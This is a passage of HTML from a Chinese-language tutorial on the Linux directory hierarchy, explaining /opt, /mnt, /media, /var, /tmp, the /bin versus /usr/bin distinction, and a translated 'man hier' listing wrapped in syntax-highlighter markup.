id=\"crayon-5b4a9d0d87ddb102411476-12\">├<span class=\"crayon-i\">meminfo</span><span class=\"crayon-h\"> </span>存储器使用信息，包括物理内存和<span class=\"crayon-i\">swap</span>。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87ddb102411476-13\">├<span class=\"crayon-i\">modules</span><span class=\"crayon-h\"> </span>当前加载了哪些核心模块。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87ddb102411476-14\">├<span class=\"crayon-i\">net</span><span class=\"crayon-h\"> </span>网络协议状态信息。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87ddb102411476-15\">├<span class=\"crayon-r\">self</span><span class=\"crayon-h\"> </span>到查看<span class=\"crayon-o\">/</span><span class=\"crayon-i\">proc</span><span class=\"crayon-h\"> </span>的程序的进程目录的符号连接。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87ddb102411476-16\">├<span class=\"crayon-i\">stat</span><span class=\"crayon-h\"> </span>系统的不同状态</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87ddb102411476-17\">├<span class=\"crayon-i\">uptime</span><span class=\"crayon-h\"> </span>系统启动的时间长度。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87ddb102411476-18\">└<span class=\"crayon-i\">version</span><span class=\"crayon-h\"> </span>核心版本。</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0035 seconds] -->\r\n\n</li>\n<li>/opt 可择的文件目录这个目录表示的是可择的意思，些自定义软件包或者第方工具，就可以安装在这里。比如在 Fedora Core 5.0 中，OpenOffice 就是安装在这里。些我们自己编译的软件包，就可以安装在这个目录中；通过源码包安装的软件，可以把它们的安装路径设置成 /opt 这样来安装。这个目录的作用一点类似 /usr/local 。</li>\n<li>/mnt 临时挂载目录这个目录一般是用于存放挂载储存设备的挂载目录的，比如磁盘，光驱，网络文件系统等，当我们需要挂载某个磁盘设备的时候，可以把磁盘设备挂载到这个目录上去，这样我们可以直接通过访问这个目录来访问那个磁盘了。一般来说，我们最好在 /mnt 目录下面多建立几个子目录，挂载的时候挂载到这些子目录上面，因为通常我们可能不仅仅是挂载一个设备吧?</li>\n<li>/media 挂载的媒体设备目录挂载的媒体设备目录，一般外部设备挂载到这里，例如 cdrom 等。比如我们插入一个U盘，我们一般会发现， Linux 自动在这个目录下建立一个 disk 目录，然后把U盘挂载到这个 disk 目录上，通过访问这个 disk 来访问U盘。</li>\n<li>/var 内容经常变化的目录此目录下文件的大小可能会改变，如缓冲文件，日志文件，缓存文件，等一般都存放在这里。</li>\n<li>/tmp 临时文件目录该目录存放系统中的一些临时文件，文件可能会被系统自动清空。的系统直接把 tmpfs 类型的文件系统挂载到这个目录上， tmpfs 文件系统由 Linux 内核支持，在这个文件系统中的数据，实际上是内存中的，由于内存的数据断电易失，当系统重新启动的时候我们就会发现这个目录被清空了。</li>\n<li>/lost+found 恢复文件存放的位置当系统崩溃的时候，在系统修复过程中需要恢复的文件，可能就会在这里被找到了，这个目录一般为空。</li>\n</ul>\n<p>以上目录，是最常见的重要目录。其中，有些目录初学者容易混淆，这里简单区分一下：</p>\n<ol>\n<li>/bin , /sbin 与 /usr/bin , /usr/sbin\n<ul>\n<li>/bin 一般存放对于用户和系统来说“必须”的程序（二进制文件）。</li>\n<li>/sbin 一般存放用于系统管理的“必需”的程序（二进制文件），一般普通用户不会使用，根用户使用。</li>\n<li>/usr/bin 一般存放的只是对用户和系统来说“不是必需的”程序（二进制文件）。</li>\n<li>/usr/sbin 一般存放用于系统管理的系统管理的不是必需的程序（二进制文件）。</li>\n</ul>\n</li>\n<li>/lib 与 /usr/lib\n<ul>\n<li>/lib 和 /usr/lib 的区别类似 /bin, /sbin 与 /usr/bin, /usr/sbin 。</li>\n<li>/lib 一般存放对于用户和系统来说“必须”的库（二进制文件）。</li>\n<li>/usr/lib 一般存放的只是对用户和系统来说“不是必需的”库（二进制文件）。</li>\n</ul>\n</li>\n</ol>\n<p>其他还一些目录例如： /home/user/bin, /home/user/opt, /home/user/etc, /usr/local/etc 等等，其作用都是类似于 /etc, /bin 等目录的，可能只是层次概念不同了，使用 Linux 时间长了，会逐渐体会到其中的含义。</p>\n<p>当然，我们可以无视这些目录，像使用Windows那样自由的，不管啥文件，想往哪存就往哪存，还是那句话，使用 Linux 时间长了，会逐渐体会到其中的含义，到时候也许我们想要乱来都不行了呢。^_^</p>\n<h3>对文件系统目录的分类标准</h3>\n<p>在大多数 Linux 系统上面，我们可以使用一个命令： man hier ，通过这个命令的输出，就知道“根目录”中所子目录的作用了。这个命令含义我不多说了，总之这里的 hier 就是对 Linux 文件系统中各级目录的标准功能，是一个大家都约定俗成了的东西。想要了解每个目录更详细的信息，需要仔细参考 man hier 的输出。下面就是一个比较简短的中文描述的对文件系统目录分类的 FHS 标准，也就是对 man hier 的简单翻译。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a9d0d87deb786039931\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nNAME 名称\r\nhier - 文件系统描述\r\n DESCRIPTION 描述\r\n一个典型的Linux系统具以下几个目录结构：\r\n/ 根目录，是所目录树开始的地方。\r\n/bin 此目录下包括了单用户方式及系统启动或修复所用到的所执行程序。\r\n/boot 包括了引导程序的静态文件。此目录下包括了在引导过程中所必需的文件。系统装载程序及配制文件在 /sbin 和 /etc 目录中找到。\r\n/dev 对应物理设备的指定文件或驱动程序。参见mknod(1)。\r\n/dos 如果MS-DOS和Linux共存于一台计算机时，这里通常用于存放DOS 文件系统。\r\n/etc 用于存放本地机的配置文件。一些大型套件，如X11，在 /etc 下它们自己的子目录。系统配置文件可以放在这里或在 /usr/etc。 不过所程序总是在 /etc 目录下查找所需的配置文件，你也可以将这些文件链接到目录 /usr/etc.\r\n/etc/skel 当建立一个新用户账号时，此目录下的文件通常被复制到用户的主目录下。\r\n/etc/X11X11 window system所需的配置文件。\r\n/home 在Linux机器上，用户主目录通常直接或间接地置在此目录下。其结构通常由本地机的管理员来决定。\r\n/lib 此目录下包含系统引导和在根用户执行命令所必需用到的共享库。\r\n/mnt 挂载临时文件系统的挂载点。\r\n/proc 这是提供运行过程和核心文件系统 proc 挂载点。这一”伪”文件系统在以下章节中详细叙述 proc(5)。\r\n/sbin 类似于 /bin 此目录保存了系统引导所需的命令，但这些命令一般使用者不能执行。\r\n/tmp 此目录用于保存临时文件，临时文件在日常维护或在系统启动时无需通知便可删除\r\n/usr 此目录通常用于从一个独立的分区上挂载文件。它应保存共享只读类文件，这样它可以被运行Linux的不同主机挂载。\r\n/usr/X11R6 X-Window系统 Version 11 release 6.\r\n/usr/X11R6/bin X-Windows系统使用的二进制文件；通常是在对更传统的 /usr/bin/X11 中文件的符号连接。\r\n/usr/X11R6/lib 保存与X-Windows系统关数据文件。\r\n/usr/X11R6/lib/X11 此目录保存与运行X-Windows系统关其他文件。通常是对来自 /usr/lib/X11 中文件的符号连接。\r\n/usr/X11R6/include/X11 此目录保存包括使用X11窗口系统进行编译程序所需的文件。通常是对来自 /usr/lib/X11 中文件的符号连接。\r\n/usr/bin 这是执行程序的主要目录，其中的绝大多数为一般使用者使用，除了那些启动系统或修复系统或不是本地安装的程序一般都放在此目录下。\r\n/usr/bin/X11\r\nX11执行文件放置的地方；在Linux系统中，它通常是对 /usr/X11R6/bin. 符号连接表\r\n/usr/dict\r\n此目录保存拼写检查器所使用的词汇表文件。\r\n/usr/doc\r\n此目录下应可以找到那些已安装的软件文件。\r\n/usr/etc\r\n此目录可用来那些存放整个网共享的配置文件。然而那可执行命令指向总是使用参照使用 /etc 目录下的文件。 /etc 目录下连接文件应指向 /usr/etc. 目录下适当的文件。\r\n/usr/include\r\nC程序语言编译使用的Include”包括”文件。\r\n/usr/include/X11\r\nC程序语言编译和X-Windows系统使用的 Include”包括”文件。它通常中指向 /usr/X11R6/include/X11. 符号连接表。\r\n/usr/include/asm\r\n申明汇编函数的Include”包括”文件，它通常是指向 /usr/src/linux/include/asm 目录的符号连接\r\n/usr/include/linux\r\n包含系统变更的信息通常是指向 /usr/src/linux/include/linux 目录的符号连接表，来获得操作系统特定信息。(注：使用者应在此自行包含那些保证自己开发的程序正常运行所需的libc 函数库。不管怎样，Linux核心系统不是设计用来执行直接运行用户程序的，它并不知道用户程序需要使用哪个版本的libc库 。如果你随意将 /usr/include/asm 和 /usr/include/linux 指向一个系统核心，系统很可能崩溃。Debian系统不这么做。它使用 libc*-dev运行包中提供的核心系统标识，以保证启动所正确的文件。)\r\n /usr/include/g++\r\nGNU C++编译程序所使用的Include”包括”文件。\r\n/usr/lib\r\n目标库文件，包括动态连接库加上一些通常不是直接调用的可执行文件案。一些复杂的程序可能在此占用整个子目录。\r\n/usr/lib/X11\r\n存放X系统数据文件及系统配置文件的地方。 Linux中通常是指向 /usr/X11R6/lib/X11 目录的符号连接表。\r\n/usr/lib/gcc-lib\r\nGNU C 编译程序所使用的可执行文件案和”包括”文件。 gcc(1).\r\n/usr/lib/groff\r\nGNU groff 文件格式系统所使用的文件。\r\n/usr/lib/uucp\r\nuucp(1) 所使用的文件。\r\n/usr/lib/zoneinfo\r\n关时区信息文件文件。\r\n/usr/local\r\n安装在本地执行程序的地方。\r\n/usr/local/bin\r\n在此地放置本地执行程序的二进制文件。\r\n/usr/local/doc\r\n放置本地文件。\r\n/usr/local/etc\r\n安装在本地程序的配置文件。\r\n/usr/local/lib\r\n安装在本地程序的库文件。\r\n/usr/local/info\r\n安装在本地程序关信息文件。\r\n/usr/local/man\r\n安装在本地程序使用手册。\r\n/usr/local/sbin\r\n安装在本地的系统管理程序。\r\n/usr/local/src\r\n安装在本地程序的原始码。\r\n/usr/man\r\n手册页通常放在此目录，或相关子目录下。\r\n/usr/man//man[1-9]\r\n此目录在指定的地方以原始码形式存放手册页。系统在所的手册页中使用自己独特的语言及代码集，可能会省略 substring 子字符串。\r\n/usr/sbin\r\n此目录保存系统管理程序的二进制码，这些文件不是系统启动或文件系统挂载 /usr 目录或修复系统所必需的。\r\n/usr/share\r\n在此目录下不同的子目录中保存了同一个操作系统在不同构架下工作时特定应用程序的共享数据。使用者可以找到通常放在 /usr/doc 或 /usr/lib 或 /usr/man 目录下的这些数据。\r\n/usr/src\r\n系统不同组成部份的源文件包括参考数据报。不要将你自己与项目关的文件放这里，因为在安装软件外，/usr下的文件属性除通常设为只读。\r\n/usr/src/linux\r\n系统核心资源通常拆包安装于此。这是系统中重要的一环，因为 /usr/include/linux 符号连接表指向此目录。你应当使用其他目录来来编译建立新核心。\r\n/usr/tmp\r\n此目录不再使用了。它应指向目录 /var/tmp。 这个链接只是出于系统兼容的目的，一般不再使用。\r\n/var\r\n此目录下文件的大小可能会改变，如缓冲文件可日志文件。\r\n/var/adm\r\n此目录为 /var/log 甩替代，通常是指向 /var/log 的符号连接表。\r\n/var/backups\r\n此目录用来存放重要系统文件的后备文件\r\n/var/catman/cat[1-9] or /var/cache/man/cat[1-9]\r\n此目录存储根据手册分类预先格式化的参考手册页。(这些参考手册页是相互独立的)\r\n/var/lock\r\n此目录存储锁定文件。依据命名习惯，设备锁定文件是 LCKxxxxx xxxxx与在文件系统中该设备名相同，使用的格式是HDU UUCP锁定文件，例如包含进程标识PID的锁定文件是一个10字节的ASCII格式的数字，后面跟一个换行符。\r\n/var/log\r\n各种日志文件。\r\n/var/preserve\r\n这是 vi(1) 存放正在编辑中的文件，以便以后可以恢复。\r\n/var/run\r\n运行时的变量文件，如存放进程标识和登入使用者信息的文件。 (utmp) 此目录下文件在系统启动时被自动清除。\r\n/var/spool\r\n各种程序产生的缓冲或排除等待的文件\r\n/var/spool/at\r\nat(1) 的作业存缓区\r\n/var/spool/cron\r\ncron(1) 的作业存缓区\r\n/var/spool/lpd\r\n打印缓存文件。\r\n/var/spool/mail\r\n使用者邮箱。\r\n/var/spool/smail\r\n存放 smail(1) 邮件发送程序的缓冲文件。\r\n/var/spool/news\r\n新闻子系统的缓冲目录\r\n/var/spool/uucp\r\nuucp(1) 的缓冲文件\r\n/var/tmp\r\n类似 /tmp, 此目录保存未指定持续时间的临时文件。</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-93\">93</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-94\">94</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-95\">95</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-96\">96</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-97\">97</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-98\">98</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-99\">99</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-100\">100</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-101\">101</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-102\">102</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-103\">103</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-104\">104</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-105\">105</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-106\">106</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-107\">107</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-108\">108</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-109\">109</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-110\">110</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-111\">111</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-112\">112</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-113\">113</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-114\">114</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-115\">115</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-116\">116</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-117\">117</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-118\">118</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-119\">119</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87deb786039931-120\">120</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87deb786039931-121\">121</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-1\"><span class=\"crayon-i\">NAME</span><span class=\"crayon-h\"> </span>名称</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-2\"><span class=\"crayon-v\">hier</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span>文件系统描述</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">DESCRIPTION</span><span class=\"crayon-h\"> </span>描述</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-4\">一个典型的<span class=\"crayon-i\">Linux</span>系统具以下几个目录结构：</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-5\"><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span>根目录，是所目录树开始的地方。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-6\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">bin</span><span class=\"crayon-h\"> </span>此目录下包括了单用户方式及系统启动或修复所用到的所执行程序。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-7\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">boot</span><span class=\"crayon-h\"> </span>包括了引导程序的静态文件。此目录下包括了在引导过程中所必需的文件。系统装载程序及配制文件在<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">sbin</span><span class=\"crayon-h\"> </span>和<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">etc</span><span class=\"crayon-h\"> </span>目录中找到。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-8\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">dev</span><span class=\"crayon-h\"> </span>对应物理设备的指定文件或驱动程序。参见<span class=\"crayon-e\">mknod</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span>。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-9\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">dos</span><span class=\"crayon-h\"> </span>如果<span class=\"crayon-v\">MS</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">DOS</span>和<span class=\"crayon-i\">Linux</span>共存于一台计算机时，这里通常用于存放<span class=\"crayon-i\">DOS</span><span class=\"crayon-h\"> </span>文件系统。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-10\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">etc</span><span class=\"crayon-h\"> </span>用于存放本地机的配置文件。一些大型套件，如<span class=\"crayon-i\">X11</span>，在<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">etc</span><span class=\"crayon-h\"> </span>下它们自己的子目录。系统配置文件可以放在这里或在<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">etc</span>。<span class=\"crayon-h\"> </span>不过所程序总是在<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">etc</span><span class=\"crayon-h\"> </span>目录下查找所需的配置文件，你也可以将这些文件链接到目录<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-11\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">skel</span><span 